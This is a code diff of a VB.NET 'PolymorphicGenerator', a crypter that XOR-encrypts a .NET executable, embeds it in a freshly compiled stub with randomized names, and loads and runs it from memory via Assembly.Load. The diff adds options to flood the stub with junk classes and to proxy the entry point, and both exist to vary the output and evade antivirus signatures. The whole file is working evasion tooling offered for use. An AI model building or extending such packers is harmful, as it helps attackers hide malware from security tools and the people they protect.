@@ -3,26 +3,67 @@
 
 Imports System.CodeDom.Compiler
 Imports System.IO
-Imports System.Reflection
-Imports System.Security.Cryptography
 Imports System.Text
+Imports Microsoft.VisualBasic.ApplicationServices
 
 Module PolymorphicGenerator
+
     Dim rnd As New Random()
 
     Sub Main()
-        If Not File.Exists(Command()) Then
+
+        Dim fileNameToPack As String = String.Empty
+
+        Dim args As String() = Environment.GetCommandLineArgs()
+
+        Dim floodWithClasses As Boolean = False,
+            numberOfClasses As Integer = 0
+
+        Dim entryPointProxy As Boolean = False
+
+        For i As Integer = 0 To args.Length - 1
+            If args(i).StartsWith("--") Then
+                Dim argKey As String = args(i).Substring(2)
+
+                Select Case argKey
+                    Case "help"
+                        Console.WriteLine(" --file {path} - specify file name" & vbLf &
+                                          " --flood - add junk classes to file" & vbLf &
+                                          " --proxy - move original entry point to from Main()")
+                        End
+                    Case "file"
+                        If i < args.Length - 1 AndAlso Not args(i + 1).StartsWith("--") Then
+                            fileNameToPack = args(i + 1)
+                        Else
+                            Console.WriteLine("Input data at --file not specified.")
+                            End
+                        End If
+                    Case "flood"
+                        floodWithClasses = True
+                        numberOfClasses = rnd.Next(10, 50)
+                    Case "proxy"
+                        entryPointProxy = True
+                    Case Else
+                        Console.ForegroundColor = ConsoleColor.Black
+                        Console.BackgroundColor = ConsoleColor.DarkYellow
+                        Console.WriteLine("WARNING: Unknown parameter: " & argKey)
+                        Console.ResetColor()
+                        End
+                End Select
+            End If
+        Next
+
+        If Not File.Exists(fileNameToPack) Then
             Console.WriteLine("File not found!")
             End
         End If
 
-        Dim FileName_ToPack = IO.Path.GetFileName(Command()),
-            FileName_NoExt = IO.Path.GetFileNameWithoutExtension(FileName_ToPack)
+        Dim fileNameToPackNoExt = IO.Path.GetFileNameWithoutExtension(fileNameToPack)
 
-        Directory.SetCurrentDirectory(IO.Path.GetDirectoryName(Path.GetFullPath(FileName_ToPack)))
+        Directory.SetCurrentDirectory(IO.Path.GetDirectoryName(Path.GetFullPath(fileNameToPack)))
 
-        Dim provider As New VBCodeProvider()
-        Dim options As New CompilerParameters()
+        Dim provider As New VBCodeProvider(),
+            options As New CompilerParameters()
 
         Dim genBuildName = GenerateRandomString()
 
@@ -35,49 +76,69 @@ Module PolymorphicGenerator
         options.ReferencedAssemblies.Add("System.dll")
         options.ReferencedAssemblies.Add("System.IO.dll")
 
-        Dim payloadName = GenerateRandomString(),
-            xorFunctionName = GenerateRandomString(),
-            injectionSubName = GenerateRandomString(),
-            streamVarName = GenerateRandomString(),
-            payloadArgName = GenerateRandomString(),
-            xorInputArgName = GenerateRandomString(),
-            xorKeyArgName = GenerateRandomString()
+        Dim payloadName As String = GenerateRandomString(),
+            xorFunctionName As String = GenerateRandomString(),
+            injectionSubName As String = GenerateRandomString(),
+            streamVarName As String = GenerateRandomString(),
+            payloadArgName As String = GenerateRandomString(),
+            xorInputArgName As String = GenerateRandomString(),
+            xorKeyArgName As String = GenerateRandomString()
 
 
-        File.Copy(FileName_ToPack, payloadName)
+        File.Copy(fileNameToPack, payloadName)
 
         Dim keyLength As Integer = rnd.Next(10, 21),
             key(keyLength - 1) As Byte
         rnd.NextBytes(key)
 
-        File.WriteAllBytes(payloadName, XorEnc(File.ReadAllBytes(FileName_ToPack), key))
+        File.WriteAllBytes(payloadName, XorEnc(File.ReadAllBytes(fileNameToPack), key))
 
         options.EmbeddedResources.Add(payloadName)
 
         Dim keyArr As String = "{" & String.Join(", ", key.Select(Function(b) b.ToString())) & "}"
 
 
+        If floodWithClasses Then
+            Console.WriteLine("Number of junk classes: " & numberOfClasses)
+        End If
+
         Console.WriteLine("Generated key:" & vbLf & " | BYTES: " & keyArr.Replace(" ", String.Empty) & vbLf & " | BASE64: " & Convert.ToBase64String(key) & vbLf &
                           "Payload size: " & New FileInfo(payloadName).Length & " bytes" & vbLf &
-                          "Key size: " & keyLength & " bytes")
+                          "Key size: " & keyLength & " bytes" & vbLf &
+                          "EP proxy: " & If(entryPointProxy, "Enabled", "Disabled"))
 
 
-        Dim sourceCode As String = $"
+        Dim sourceCode As New StringBuilder
+
+        sourceCode.AppendLine($"
 Imports System.IO
-Imports System.Reflection
+Imports System.Reflection")
 
-Module {GenerateRandomString()}
-Sub Main()
-    Using {streamVarName} As Stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(""{payloadName}"")
+        sourceCode.AppendLine($"Module {GenerateRandomString()}")
+
+        sourceCode.AppendLine($"Sub Main()")
+
+        If entryPointProxy Then
+            Dim originalEpName = GenerateRandomString()
+
+            sourceCode.AppendLine($"
+{originalEpName}()
+End Sub
+
+Sub {originalEpName}
+")
+        End If
+
+        sourceCode.AppendLine($"Using {streamVarName} As Stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(""{payloadName}"")
         If Not {streamVarName} Is Nothing Then
             Using reader As New BinaryReader({streamVarName})
                 {injectionSubName}( {xorFunctionName}(reader.ReadBytes(CInt({streamVarName}.Length)) , {keyArr} ) )
             End Using
         End If
     End Using
-End Sub
+End Sub")
 
-Sub {injectionSubName}({payloadArgName}) ' injection
+        sourceCode.AppendLine($"Sub {injectionSubName}({payloadArgName}) ' injection
     Assembly.Load({payloadArgName}).EntryPoint.Invoke(Nothing, Nothing)
 End Sub
 
@@ -88,8 +149,17 @@ Function {xorFunctionName}({xorInputArgName} As Byte(), {xorKeyArgName} As Byte(
     Next
     Return encryptedArray
 End Function
-End Module"
-        Dim results As CompilerResults = provider.CompileAssemblyFromSource(options, sourceCode)
+End Module
+")
+
+        If floodWithClasses Then
+            For i = 0 To numberOfClasses
+                sourceCode.AppendLine($"Class {GenerateRandomString()} : End Class")
+            Next
+        End If
+
+
+        Dim results As CompilerResults = provider.CompileAssemblyFromSource(options, sourceCode.ToString())
 
 
         If results.Errors.Count > 0 Then
@@ -97,7 +167,7 @@ End Module"
                 Console.WriteLine(errorObj.ErrorText, &H10)
             Next
         Else
-            Dim FileCreated = $"{FileName_ToPack}_xor-packed.exe"
+            Dim FileCreated = $"{fileNameToPack}_xor-packed.exe"
             If File.Exists(FileCreated) Then
                 File.Delete(FileCreated)
             End If
